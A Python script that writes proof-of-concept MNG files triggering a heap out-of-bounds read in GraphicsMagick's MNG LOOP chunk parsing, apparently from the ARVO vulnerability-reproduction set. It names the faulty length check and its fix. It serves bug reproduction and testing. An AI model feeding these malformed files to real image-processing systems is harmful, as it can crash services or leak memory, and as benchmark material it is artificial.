#!/usr/bin/env python3
"""
Generate a PoC for ARVO 10400: ReadMNGImage() mng_LOOP chunk
not validated to be at least 5 bytes.

Bug location: graphicsmagick/coders/png.c lines 4908-4920
  4912: if (length > 0)              // checks >0 but not >=5
  4914:   loop_level = chunk[0];     // reads byte 0
  4920:   loop_iters = mng_get_long(&chunk[1]);  // reads bytes 1-4 (OOB!)

Fix: change "length > 0" to "length >= 5"

MNG file format:
  - 8-byte MNG signature
  - Chunks: [4-byte length][4-byte type][data][4-byte CRC]
  - Must start with MHDR chunk
  - LOOP chunk type bytes: {76, 79, 79, 80} = "LOOP"
  - Must end with MEND chunk
"""
import struct
import sys
import zlib

def make_chunk(chunk_type: bytes, data: bytes) -> bytes:
    """Build a PNG/MNG chunk: length + type + data + CRC."""
    length = struct.pack(">I", len(data))
    crc = struct.pack(">I", zlib.crc32(chunk_type + data) & 0xFFFFFFFF)
    return length + chunk_type + data + crc

# MNG signature (NOT PNG!)
MNG_SIGNATURE = b"\x8a\x4d\x4e\x47\x0d\x0a\x1a\x0a"

# MHDR: required first chunk in MNG
# 28 bytes: width(4) + height(4) + ticks(4) + layercount(4) +
#           framecount(4) + playtime(4) + simplicity(4)
mhdr_data = struct.pack(">IIIIIII",
    1,    # width
    1,    # height
    1,    # ticks per second
    1,    # nominal layer count
    1,    # nominal frame count
    0,    # nominal play time
    3,    # simplicity profile (MNG-LC)
)

# LOOP chunk with only 1 byte of data — triggers the bug!
# Code checks "length > 0" (true for 1), then reads chunk[0] (ok)
# and mng_get_long(&chunk[1]) which reads bytes 1-4 (heap OOB read!)
loop_data_1byte = b"\x00"       # just loop_level, no iteration count

# Also generate variants with 2, 3, 4 bytes (all trigger the bug)
loop_data_2byte = b"\x00\x01"
loop_data_3byte = b"\x00\x01\x00"
loop_data_4byte = b"\x00\x01\x00\x00"

# MEND: required last chunk in MNG (empty)
mend_data = b""

def build_mng(loop_data: bytes) -> bytes:
    out = MNG_SIGNATURE
    out += make_chunk(b"MHDR", mhdr_data)
    out += make_chunk(b"LOOP", loop_data)
    out += make_chunk(b"MEND", mend_data)
    return out

if __name__ == "__main__":
    outdir = sys.argv[1] if len(sys.argv) > 1 else "."

    # Primary: 1-byte LOOP chunk (minimal trigger)
    poc = build_mng(loop_data_1byte)
    path = f"{outdir}/poc_mng_loop_1byte.bin"
    with open(path, "wb") as f:
        f.write(poc)
    print(f"Written {len(poc)} bytes to {path}")

    # Variants
    for i, data in enumerate([loop_data_2byte, loop_data_3byte, loop_data_4byte]):
        poc = build_mng(data)
        path = f"{outdir}/poc_mng_loop_{i+2}byte.bin"
        with open(path, "wb") as f:
            f.write(poc)
        print(f"Written {len(poc)} bytes to {path}")

    # Also write to stdout for piping
    sys.stdout.buffer.write(build_mng(loop_data_1byte))
